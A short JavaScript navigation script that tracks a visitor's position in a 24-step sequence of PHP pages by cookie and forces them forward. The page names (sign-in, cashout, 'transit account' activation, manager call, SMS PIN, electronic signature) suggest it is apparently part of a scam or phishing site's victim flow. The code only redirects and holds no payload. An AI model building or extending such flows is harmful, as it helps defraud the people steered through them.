var cookee_page_id;
var pages = [
    {id: 1, page: "index.php"},
    {id: 2, page: "loading_signin.php"},
    {id: 3, page: "signin_f.php"},
    {id: 4, page: "signin_s.php"},
    {id: 5, page: "signin_process.php"},
    {id: 6, page: "lk.php"},
    {id: 7, page: "cashout_1.php"},
    {id: 8, page: "cashout_2.php"},
    {id: 9, page: "cashout_3.php"},
    {id: 10, page: "loading_send_money_2.php"},
    {id: 11, page: "paperwork.php"},
    {id: 12, page: "generating_paperwork.php"},
    {id: 13, page: "registration.php"},
    {id: 14, page: "approve_schet.php"},
    {id: 15, page: "send_to_transit.php"},
    {id: 16, page: "transit_schet_activation.php"},
    {id: 17, page: "new_message.php"},
    {id: 18, page: "manager_call.php"},
    {id: 19, page: "manager_call_proccess.php"},
    {id: 20, page: "checking_phone_number.php"},
    {id: 21, page: "sms_pincode_activate.php"},
    {id: 22, page: "ecp.php"},
    {id: 23, page: "ecp_inspector.php"},
    {id: 24, page: "success.php"},


];


function setCookie(name, value, days) {
    var date = new Date();
    date.setTime(date.getTime() + (days*24*60*60*1000));
    var expires = "; expires=" + date.toGMTString();
    document.cookie = name + "=" + value + expires;
}

function readCookie(name) {
    var n = name + "=";
    var cookie = document.cookie.split(';');
    for(var i=0;i < cookie.length;i++) {
        var c = cookie[i];
        while (c.charAt(0)==' '){c = c.substring(1,c.length);}
        if (c.indexOf(n) == 0){return c.substring(n.length,c.length);}
    }
    return null;
}

function redirectPage(page_id){
    var page;
    for (var i = 0; i < pages.length; i++) {
        if (pages[i].id == page_id)  {
            page = pages[i].page;
            break;
        }
    }
    window.location.href = page;
    document.location = page;
    
    
    // location.reload();
}

function load() {
    cookee_page_id = readCookie('page_id');
    if(cookee_page_id == null) {
        setCookie('page_id', page_id, 30);
    }
    // console.log(cookee_page_id);
}

function init() {
    if(cookee_page_id != null) {
        if(+page_id < +cookee_page_id) {
            redirectPage(cookee_page_id);
  		}
  		if(+page_id > +cookee_page_id) {
  			setCookie('page_id', page_id, 30);
        }
    }
}

load();
init();